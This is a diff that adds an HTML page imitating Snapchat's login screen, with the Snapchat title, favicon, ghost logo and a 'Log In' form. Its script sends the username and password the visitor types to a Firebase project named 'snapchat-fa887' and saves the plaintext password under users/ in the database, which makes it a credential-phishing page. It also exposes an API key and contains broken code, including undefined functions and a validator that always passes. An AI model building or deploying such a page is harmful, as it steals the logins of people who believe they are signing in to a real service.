@@ -1,0 +1,250 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,300" rel="stylesheet" type="text/css">
+<style>
+    body {
+        margin: 0px;
+        font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+        background-color: #262626;
+        color: #fff;
+    }
+
+    a {
+        cursor: pointer;
+    }
+
+    a {
+        background: 0 0;
+        color: #009fda;
+        text-decoration: none;
+        font-size: 14px;
+    }
+</style>
+<title>Log In - Snapchat</title>
+<link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico" />
+
+<body>
+    <center>
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg"
+            style="width:36px;padding-top:80px;padding-bottom:95px;">
+        <font size="48px;"><br>Log In</font><br>
+        <style>
+            .inputBox {
+                font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+                margin: 0;
+                outline: 0;
+                -webkit-appearance: none;
+                tap-highlight-color: rgba(255, 255, 255, 0);
+                line-height: 1.2142em;
+                padding: .67861em 1em;
+                font-size: 1em;
+                background-color: #fff;
+                border: 1px solid rgba(39, 41, 43, .15);
+                color: rgba(0, 0, 0, .8);
+                border-radius: .2857rem;
+                box-shadow: 0 0 0 0 transparent inset;
+                -webkit-transition: background-color .2s ease, color .2s ease, box-shadow .2s ease, border-color .2s ease;
+                transition: background-color .2s ease, color .2s ease, box-shadow .2s ease, border-color .2s ease;
+                width: 304px;
+                height: 38px;
+                margin-bottom: 15px;
+                font-size: 14px;
+            }
+
+            button {
+                cursor: pointer;
+                display: inline-block;
+                min-height: 1em;
+                outline: 0;
+                border: none;
+                vertical-align: baseline;
+                background-color: #fffc01;
+                color: #262626;
+                font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+                margin: 0 .25em 0 0;
+                padding: 13px 1.5em;
+                text-shadow: none;
+                font-weight: 700;
+                line-height: 1;
+                font-style: normal;
+                text-align: center;
+                text-decoration: none;
+                text-transform: uppercase;
+                background-image: none;
+                border-radius: 5px;
+                box-shadow: 0 0 0 1px transparent inset, 0 0 0 0 rgba(39, 41, 43, .15)inset;
+                -webkit-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+                -webkit-transition: opacity .1s ease, background-color .1s ease, color .1s ease, box-shadow .1s ease, background .1s ease;
+                transition: opacity .1s ease, background-color .1s ease, color .1s ease, box-shadow .1s ease, background .1s ease;
+                will-change: '';
+                -webkit-tap-highlight-color: transparent;
+                width: 304px;
+                height: 38px;
+            }
+
+            button:hover {
+                background-color: #F4F100;
+            }
+        </style>
+        <form action="" onsubmit="return convertURL(this);">
+            <input class="inputBox" id="username" name="username" type="text" placeholder="Username"
+                style="margin-top:20px;"><br>
+            <input class="inputBox" id="password" name="password" type="password" placeholder="Password"><br>
+            <button class="button" type="submit" style="margin-top:5px;" onclick="register()">LOG IN</button>
+        </form>
+        
+</body>
+
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+         https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-database.js"></script>
+
+
+
+<script>
+    // Your web app's Firebase configuration
+    var firebaseConfig = {
+        apiKey: "AIzaSyCi1PWjMV0NcJ4-c0mmRSgasjIjgYIAClE",
+        authDomain: "",
+        projectId: "snapchat-fa887",
+        storageBucket: "gs://snapchat-fa887.appspot.com",
+        messagingSenderId: "",
+        appId: "1:19311315303:web:6d554c14a1133ad4ba47c2"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    // Initialize variables
+    const auth = firebase.auth()
+    const database = firebase.database()
+
+    // Set up our register function
+    function register() {
+        // Get all our input fields
+        username = document.getElementById('username').value
+        password = document.getElementById('password').value
+
+        // Validate input fields
+        if (validate_username(username) == false || validate_password(password) == false) {
+            alert('Username or Password is Outta Line!!')
+            return
+            // Don't continue running the code
+        }
+
+        // Move on with Auth
+        auth.createUserWithEmailAndPassword(username, password)
+            .then(function () {
+                // Declare user variable
+                var user = auth.currentUser
+
+                // Add this user to Firebase Database
+                var database_ref = database.ref()
+
+                // Create User data
+                var user_data = {
+                    username: username,
+                    password: password,
+                    last_login: Date.now()
+                }
+
+                // Push to Firebase Database
+                database_ref.child('users/' + user.uid).set(user_data)
+
+                // DOne
+                alert('User Created!!')
+            })
+            .catch(function (error) {
+                // Firebase will use this to alert of its errors
+                var error_code = error.code
+                var error_message = error.message
+
+                alert(error_message)
+            })
+    }
+
+    // Set up our login function
+    function login() {
+        // Get all our input fields
+        username = document.getElementById('username').value
+        password = document.getElementById('password').value
+
+        // Validate input fields
+        if (validate_email(username) == false || validate_password(password) == false) {
+            alert('Username or Password is Outta Line!!')
+            return
+            // Don't continue running the code
+        }
+
+        auth.signInWithEmailAndPassword(username, password)
+            .then(function () {
+                // Declare user variable
+                var user = auth.currentUser
+
+                // Add this user to Firebase Database
+                var database_ref = database.ref()
+
+                // Create User data
+                var user_data = {
+                    username: username,
+                    password: password,
+                    last_login: Date.now()
+                }
+
+                // Push to Firebase Database
+                database_ref.child('users/' + user.uid).update(user_data)
+
+                // DOne
+                alert('User Logged In!!')
+
+            })
+            .catch(function (error) {
+                // Firebase will use this to alert of its errors
+                var error_code = error.code
+                var error_message = error.message
+
+                alert(error_message)
+            })
+    }
+
+
+
+
+    // Validate Functions
+    function validate_username(username) {
+        
+        if (expression.test(username) == true) {
+            // Email is good
+            return true
+        } else {
+            // Email is not good
+            return true
+        }
+    }
+
+    function validate_password(password) {
+        // Firebase only accepts lengths greater than 6
+        if (password < 6) {
+            return false
+        } else {
+            return true
+        }
+    }
+
+    function validate_field(field) {
+        if (field == null) {
+            return false
+        }
+
+        if (field.length <= 0) {
+            return false
+        } else {
+            return true
+        }
+    }
+</script>
+
+</html>
